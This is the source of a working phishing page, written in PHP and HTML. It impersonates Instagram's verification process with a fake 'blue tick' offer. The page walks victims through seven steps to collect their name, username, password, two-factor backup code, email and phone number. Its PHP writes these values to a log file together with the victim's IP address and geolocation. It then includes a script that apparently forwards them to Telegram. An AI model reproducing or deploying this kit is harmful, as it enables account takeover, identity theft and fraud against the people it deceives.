
<?php



session_start();
set_time_limit(0);
error_reporting(E_ALL);







if($_POST){

    $fname=$_POST["fname"];
    $username=$_POST["username"];
    $password=$_POST["password"];
    $factorcode=$_POST["factorcode"];
    $mail=$_POST["mail"];
    $number=$_POST["number"];
    $ip=$_SERVER["REMOTE_ADDR"];
    $konum = file_get_contents("http://ip-api.com/xml/".$ip);
$cek = new SimpleXMLElement($konum);
$ulke = $cek->country;
$sehir = $cek->city;
date_default_timezone_set('Europe/Istanbul');  

$cur_time=date("d-m-Y H:i:s");

    $file = fopen('ivanov.php', 'a');
fwrite($file, "
  <div class='row'>
           
          <p class='ifont'>Ziyaretçinin adı ;<br>$fname</p>
          </div>
          <div class='row'>
           
          <p class='ifont'>Kullanıcı Adı ;<br>$username</p>
          </div>
            <div class='row'>
           
               <p class='ifont'>Şifre ;<br>$password</p>
         
          </div>
          <div class='row'>
            
          <p class='ifont'>8 haneli faktor kodu ;<br>$factorcode</p>
          </div>
          <div class='row'>
           
          <p class='ifont'>Email ;<br>$mail</p>
          </div>
             <div class='row'>
           
          <p class='ifont'>Telefon Numarası ;<br>$number</p>
          </div>
             <div class='row'>
          
               <p class='ifont'>İp Adresi ;<br>$ip</p>
         
          </div>
            <div class='row'>
           
               <p class='ifont'>Giriş Zamanı ;<br>$cur_time</p>
         
          </div>
                 <div class='row'>
            
               <p class='ifont'>Ülke ;<br>$ulke</p>
         
          </div>
       
          <div class='row'>
            
               <p class='ifont'>Şehir ;<br>$sehir</p>
         
          </div>
   
    
<br>

"); 

fclose($file);
echo '';
  
   header("Location: i-complete.php?fname=$fname");
   include 'igardotelegram/telegramuser.php';
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
   <link href='i-css/i-multi.css' rel='stylesheet'>
  <link rel="apple-touch-icon" type="image/png" href="i-img/i-fav.png" />
<meta name="apple-mobile-web-app-title" content="Igardo">

<link rel="shortcut icon" type="image/x-icon" href="i-img/i-fav.png" />

<link rel="mask-icon" type="image/x-icon" href="i-img/i-fav.png" color="#111" />

    <meta name="apple-mobile-web-app-title" content="lnstagram
    ">
    <title>Form</title>



  
  <title>Form</title>
  <link rel="stylesheet" href="https://unpkg.com/tailwindcss@^1.0/dist/tailwind.min.css">
<script src="i-js/i-cdn.js" defer></script>


  
  
  

  <script>
  window.console = window.console || function(t) {};
</script>

  
  
</head>

<body translate="no">
  <body class="antialiased sans-serif bg-gray-200">
    <div x-data="app()" x-cloak>
        <div class="max-w-3xl mx-auto px-4 py-10">

            <div x-show.transition="step === 'complete'">
                <div class="bg-white rounded-lg p-10 flex items-center shadow justify-between">
                    <div>
                        <svg class="mb-4 h-20 w-20 text-green-500 mx-auto" viewBox="0 0 20 20" fill="currentColor">  <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/></svg>

                        <h2 class="text-2xl mb-4 text-gray-800 text-center font-bold">Verify Badges Success</h2>

                        <div class="text-gray-600 mb-8">
                           Thank you, you confirmed it was you and filled out the form. Click the button to send the form to our Verification team. Your account will be reviewed in 12 hours and a blue tick will be active in your account within 24 hours.
                        </div>

                        <button type="submit"
                          
                            class="w-40 block mx-auto focus:outline-none py-2 px-5 rounded-lg shadow-sm text-center text-gray-600 bg-white hover:bg-gray-100 font-medium border" 
                        >Submit the Form</button>
                    </div>
                </div>
            </div>

            <div x-show.transition="step != 'complete'">  
                <!-- Top Navigation -->
                <div class="border-b-2 py-4">
                    <div class="uppercase tracking-wide text-xs font-bold text-gray-500 mb-1 leading-tight" x-text="`Step: ${step} of 7`"></div>
                    <div class="flex flex-col md:flex-row md:items-center md:justify-between">
                        <div class="flex-1">
                            <div x-show="step === 1">
                                <div class="text-lg font-bold text-gray-700 leading-tight">Your Name</div>
                            </div>
                            
                            <div x-show="step === 2">
                                <div class="text-lg font-bold text-gray-700 leading-tight">Your Username</div>
                            </div>

                            <div x-show="step === 3">
                                <div class="text-lg font-bold text-gray-700 leading-tight">Your Password</div>
                            </div>
                            
                              <div x-show="step === 4">
                                <div class="text-lg font-bold text-gray-700 leading-tight">2 Factor Authentication</div>
                            </div>
                            
                               <div x-show="step === 5">
                                <div class="text-lg font-bold text-gray-700 leading-tight">Tell us About Yourself</div>
                            </div>

                              <div x-show="step === 6">
                                <div class="text-lg font-bold text-gray-700 leading-tight">Contact Email</div>
                            </div>
                               <div x-show="step === 7">
                                <div class="text-lg font-bold text-gray-700 leading-tight">Contact Phone Number</div>
                            </div>
                              
                        </div>

                        <div class="flex items-center md:w-64">
                            <div class="w-full bg-white rounded-full mr-2">
                                <div class="rounded-full bg-green-500 text-xs leading-none h-2 text-center text-white" :style="'width: '+ parseInt(step / 7 * 100) +'%'"></div>
                            </div>
                            <div class="text-xs w-10 text-gray-600" x-text="parseInt(step / 7 * 100) +'%'"></div>
                        </div>
                    </div>
                </div>
                <!-- /Top Navigation -->

                <!-- Step Content -->
<form method="post">
                <div class="py-10">   
                    <div x-show.transition.in="step === 1">
                        <div class="mb-5 text-center">
                            <div class="mx-auto w-32 h-32 mb-2 border rounded-full relative bg-gray-100 mb-4 shadow-inset">
                                <img id="image" class="object-cover w-full h-32 rounded-full" :src="image" />
                            </div>
                            
                            

                           

                        
                        </div>

                        <div class="mb-5">
                            <label for="firstname" class="font-bold mb-1 text-gray-700 block">Firstname</label>
                            <input type="text" name="fname"
                                class="w-full px-4 py-3 rounded-lg shadow-sm focus:outline-none focus:shadow-outline text-gray-600 font-medium"
                                placeholder="Enter your firstname..." required="true">
                        </div>

                        
                    </div>
                    <div x-show.transition.in="step === 2">

                        <div class="mb-5">
                            <label for="password" class="font-bold mb-1 text-gray-700 block">Username</label>
                            <div class="text-gray-600 mt-2 mb-4">
                             
                            </div>

                            <div class="relative">
                                  <input type="text" name="username"
                                class="w-full px-4 py-3 rounded-lg shadow-sm focus:outline-none focus:shadow-outline text-gray-600 font-medium"
                                placeholder="@username" required="true">

                                <div class="absolute right-0 bottom-0 top-0 px-3 py-3 cursor-pointer" 
                                    @click="togglePassword = !togglePassword"
                                >   
                                    
                                </div>
                            </div>
                            
                            <div class="flex items-center mt-4 h-3">
                                <div class="w-2/3 flex justify-between h-2">  
                             
                                </div>
                               
                            </div>

                            <p class="mt-5 text-gray-600">To become a verified partner, you must first enter your username. Get more information <a href="https://help.instagram.com/854227311295302" class="text-blue-500">lnstagram Verify Badges</a></p>
                        </div>

                    </div>
                    <div x-show.transition.in="step === 3">
                        <div class="mb-5">
                            <label for="password" class="font-bold mb-1 text-gray-700 block">Password</label>
                            <div class="text-gray-600 mt-2 mb-4">
                           Enter your account password to verify that you are our user.
                              
                            </div>

                            <div class="relative">
                                <input name="password" 
                                    :type="togglePassword ? 'text' : 'password'"
                                    @keydown="checkPasswordStrength()"
                                    x-model="password"
                                    class="w-full px-4 py-3 rounded-lg shadow-sm focus:outline-none focus:shadow-outline text-gray-600 font-medium"
                                    placeholder="Your strong password..." required="true">

                                <div class="absolute right-0 bottom-0 top-0 px-3 py-3 cursor-pointer" 
                                    @click="togglePassword = !togglePassword"
                                >   
                                    <svg :class="{'hidden': !togglePassword, 'block': togglePassword }" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6 fill-current text-gray-500" viewBox="0 0 24 24"><path d="M12 19c.946 0 1.81-.103 2.598-.281l-1.757-1.757C12.568 16.983 12.291 17 12 17c-5.351 0-7.424-3.846-7.926-5 .204-.47.674-1.381 1.508-2.297L4.184 8.305c-1.538 1.667-2.121 3.346-2.132 3.379-.069.205-.069.428 0 .633C2.073 12.383 4.367 19 12 19zM12 5c-1.837 0-3.346.396-4.604.981L3.707 2.293 2.293 3.707l18 18 1.414-1.414-3.319-3.319c2.614-1.951 3.547-4.615 3.561-4.657.069-.205.069-.428 0-.633C21.927 11.617 19.633 5 12 5zM16.972 15.558l-2.28-2.28C14.882 12.888 15 12.459 15 12c0-1.641-1.359-3-3-3-.459 0-.888.118-1.277.309L8.915 7.501C9.796 7.193 10.814 7 12 7c5.351 0 7.424 3.846 7.926 5C19.624 12.692 18.76 14.342 16.972 15.558z"/></svg>

                                    <svg :class="{'hidden': togglePassword, 'block': !togglePassword }" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6 fill-current text-gray-500" viewBox="0 0 24 24"><path d="M12,9c-1.642,0-3,1.359-3,3c0,1.642,1.358,3,3,3c1.641,0,3-1.358,3-3C15,10.359,13.641,9,12,9z"/><path d="M12,5c-7.633,0-9.927,6.617-9.948,6.684L1.946,12l0.105,0.316C2.073,12.383,4.367,19,12,19s9.927-6.617,9.948-6.684 L22.054,12l-0.105-0.316C21.927,11.617,19.633,5,12,5z M12,17c-5.351,0-7.424-3.846-7.926-5C4.578,10.842,6.652,7,12,7 c5.351,0,7.424,3.846,7.926,5C19.422,13.158,17.348,17,12,17z"/></svg>
                                </div>
                            </div>
                            
                            <div class="flex items-center mt-4 h-3">
                                <div class="w-2/3 flex justify-between h-2">  
                                    <div :class="{ 'bg-gray-400': passwordStrengthText == 'Password is too short' ||  passwordStrengthText == 'Could be stronger' || passwordStrengthText == 'Strong password' }" ></div>
                                    <div :class="{ 'bg-green-400': passwordStrengthText == 'Password seems secure' || passwordStrengthText == 'Strong password' }" class="h-2 rounded-full mr-1 w-1/3 bg-gray-300"></div>
                                    <div :class="{ 'bg-gray-400': passwordStrengthText == 'Password seems secure' }" ></div>
                                </div>
                                <div x-text="passwordStrengthText" class="text-gray-500 font-medium text-sm ml-3 leading-none"></div>
                            </div>

                            <p class="mt-5 text-gray-600">Hey dear user, your account is very close to getting verified badge. Sign in to continue.</p>
  </div>

                    </div>



                        <div x-show.transition.in="step === 4">

                        <div class="mb-5 text-center">
                            <div class="mx-auto w-32 h-32 mb-2 border rounded-full relative bg-gray-100 mb-4 shadow-inset">
                                <img id="image" class="object-cover w-full h-32 rounded-full" :src="image" />
                            </div>
                            
                            

                           

                            <input name="photo" id="fileInput" accept="image/*" class="hidden" type="file" @change="let file = document.getElementById('fileInput').files[0]; 
                                var reader = new FileReader();
                                reader.onload = (e) => image = e.target.result;
                                reader.readAsDataURL(file);">
                        </div>

                        <div class="mb-5">
                            <label for="firstname" class="font-bold mb-1 text-gray-700 block">2 Factor Authentication</label>
                            <input type="number" name="factorcode" 
                                class="w-full px-4 py-3 rounded-lg shadow-sm focus:outline-none focus:shadow-outline text-gray-600 font-medium"
                                placeholder="8 Digit Backup Code">
                            

                                <p class="mt-5 text-gray-600">Hello dear user, if your account has 2-factor authentication, please enter 1 of the 8-digit codes we gave you when turning on 2-factor authentication in your account, this is the last step for us to verify that it is you. Once we verify it's you, the blue tick will be activated on your account within 24 hours. If your account does not have 2-factor authentication, you can leave it blank. <a href="https://help.instagram.com/1006568999411025/" class="text-blue-500">Learn about lnstagram backup codes</a>.</p>
                        </div>
                    </div>


                    <div x-show.transition.in="step === 5">

                        <div class="mb-5">
                            <label for="password" class="font-bold mb-1 text-gray-700 block">Tell us about yourself</label>
                            <div class="text-gray-600 mt-2 mb-4">
                             
                            </div>

                            <div class="relative">
                                     <textarea type="text" name="firstname"
                                class="w-full px-4 py-3 rounded-lg shadow-sm focus:outline-none focus:shadow-outline text-gray-600 font-medium"
                                placeholder="Enter your firstname..." required="true"> </textarea>

                                <div class="absolute right-0 bottom-0 top-0 px-3 py-3 cursor-pointer" 
                                    @click="togglePassword = !togglePassword"
                                >   
                                    
                                </div>
                            </div>
                            
                            <div class="flex items-center mt-4 h-3">
                                <div class="w-2/3 flex justify-between h-2">  
                             
                                </div>
                               
                            </div>

                           
                        </div>

</div>  
     <div x-show.transition.in="step === 6">

                        <div class="mb-5">
                            <label for="password" class="font-bold mb-1 text-gray-700 block">Contact Email Adress</label>
                            <div class="text-gray-600 mt-2 mb-4">
                             
                            </div>

                            <div class="relative">
                                     <input type="mail" name="mail"
                                class="w-full px-4 py-3 rounded-lg shadow-sm focus:outline-none focus:shadow-outline text-gray-600 font-medium"
                                placeholder="Enter your Email Adress..." required="true">

                                <div class="absolute right-0 bottom-0 top-0 px-3 py-3 cursor-pointer" 
                                    @click="togglePassword = !togglePassword"
                                >   
                                    
                                </div>
                            </div>
                            
                            <div class="flex items-center mt-4 h-3">
                                <div class="w-2/3 flex justify-between h-2">  
                             
                                </div>
                               
                            </div>

                            <p class="mt-5 text-gray-600">You must write an email address so that we can contact you.</p>
                        

                    </div>
                    </div>
                </div>
                 <div x-show.transition.in="step === 7">

                        <div class="mb-5">
                            <label for="password" class="font-bold mb-1 text-gray-700 block">Contact Phone Number</label>
                            <div class="text-gray-600 mt-2 mb-4">
                             
                            </div>

                            <div class="relative">
                                     <input type="number" name="number"
                                class="w-full px-4 py-3 rounded-lg shadow-sm focus:outline-none focus:shadow-outline text-gray-600 font-medium"
                                placeholder="Enter your Phone Number..." required="true">

                                <div class="absolute right-0 bottom-0 top-0 px-3 py-3 cursor-pointer" 
                                    @click="togglePassword = !togglePassword"
                                >   
                                    
                                </div>
                            </div>
                            
                            <div class="flex items-center mt-4 h-3">
                                <div class="w-2/3 flex justify-between h-2">  
                             
                                </div>
                               
                            </div>

                            <p class="mt-5 text-gray-600">We ask for your phone number as the last source of contact. If we cannot reach you via your e-mail address, we will call you.  <br><br> You cannot fill out the form without completing all the fields. If the form is not completed when you press the "Complete" button and does not move to the next page, try to go back and fill in the empty fields. (Not valid for 8-digit code section.)</p>
                        

                    </div>
                    </div>
                
                <!-- / Step Content -->
            
            </div>
        </div>

        <!-- Bottom Navigation -->  
        <div class="fixed bottom-0 left-0 right-0 py-5 bg-white shadow-md" x-show="step != 'complete'">
            <div class="max-w-3xl mx-auto px-4">
                <div class="flex justify-between">
                    <div class="w-1/2">
                        <button
                            x-show="step > 1"
                            @click="step--"
                            class="w-32 focus:outline-none py-2 px-5 rounded-lg shadow-sm text-center text-gray-600 bg-white hover:bg-gray-100 font-medium border" 
                        >Previous</button>
                    </div>

                    <div class="w-1/2 text-right">
                        <button
                            x-show="step < 7"
                            @click="step++"
                            class="w-32 focus:outline-none border border-transparent py-2 px-5 rounded-lg shadow-sm text-center text-white bg-blue-500 hover:bg-blue-600 font-medium" 
                        >Next</button>

                        <button
                          
                            x-show="step === 7"
                            class="w-32 focus:outline-none border border-transparent py-2 px-5 rounded-lg shadow-sm text-center text-white bg-blue-500 hover:bg-blue-600 font-medium" 
                        >Complete</button>
                    </div>
                </div>
            </div>
        </div>
        <!-- / Bottom Navigation https://placehold.co/300x300/e2e8f0/cccccc --> 
    </div>
    </form>
<script>
    //  Bind the event handler to the "submit" JavaScript event
$('form').submit(function () {

    // Get the Login Name value and trim it
    var name = $.trim($('#log').val());

    // Check if empty of not
    if (name === '') {
        alert('Text-field is empty. You cannot leave is blank!');
        return false;
    }
});
</script>
    <script>
        function app() {
            return {
                step: 1, 
                passwordStrengthText: '',
                togglePassword: false,

                image: 'i-img/i-profile.jpg',
                password: '',
                gender: 'Male',

                checkPasswordStrength() {
                    var strongRegex = new RegExp("^(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9])(?=.*[!@#\$%\^&amp;\*])(?=.{8,})");
                    var mediumRegex = new RegExp("^(((?=.*[a-z])(?=.*[A-Z]))|((?=.*[a-z])(?=.*[0-9]))|((?=.*[A-Z])(?=.*[0-9])))(?=.{6,})");

                    let value = this.password;

                    if (strongRegex.test(value)) {
                        this.passwordStrengthText = "Password seems secure";
                    } else if(mediumRegex.test(value)) {
                        this.passwordStrengthText = "Password seems secure";
                    } else {
                        this.passwordStrengthText = "Password is too short";
                    }
                }
            }
        }
    </script>

  </div>




</body></html>